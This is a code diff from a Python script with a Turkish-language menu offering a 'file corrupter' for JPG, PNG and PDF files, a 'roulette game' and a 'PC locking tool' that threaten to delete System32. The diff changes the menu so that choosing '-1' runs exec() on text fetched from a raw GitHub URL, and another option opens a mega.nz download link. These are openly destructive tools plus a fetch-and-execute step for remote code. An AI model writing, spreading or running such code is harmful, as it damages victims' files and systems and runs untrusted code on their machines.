@@ -23,13 +23,14 @@ mine = """\033[1;39m
 \033[1;31m[\033[1;39m1.1\033[1;31m] \033[1;32mDosya Bozucu \033[1;31m[\033[1;33mSadece JPG-PNG-PDF Dosyalarinda Calisir\033[1;31m]  
 \033[1;31m[\033[1;39m2.1\033[1;31m] \033[1;32mRulet Oyunu \033[1;31m[\033[1;33mSystem32 Kurtarmak Icin Dogru Rakami Bul\033[1;31m]
 \033[1;31m[\033[1;39m3.1\033[1;31m] \033[1;32mPc Kilitleme Araci \033[1;31m[\033[1;33m5 Dk Icinde Sifreyi Bulmazsan System32 Silinir\033[1;31m]
+\033[1;31m[\033[1;39m-1\033[1;31m] \033[1;32mGeri Dön \033[1;31m[\033[1;33mGeri Dönmek İçin -1 Yaz\033[1;31m]  
 """
 print(mine)
 while True:
     os.system('cls')
     print(mine)
     chon = input('                                               \033[1;39m[\033[1;31m×\033[1;39m] \033[1;39m>> ')
-    if chon == '0':
+    if chon == '-1':
         exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Main.txt').text)
     elif chon == '1.1':
         webbrowser.open_new("https://mega.nz/file/grcWUAKZ#xipEo0wldKN6BuLOUKAkffAQlWghLrz9tqq9_jb2M0I")   
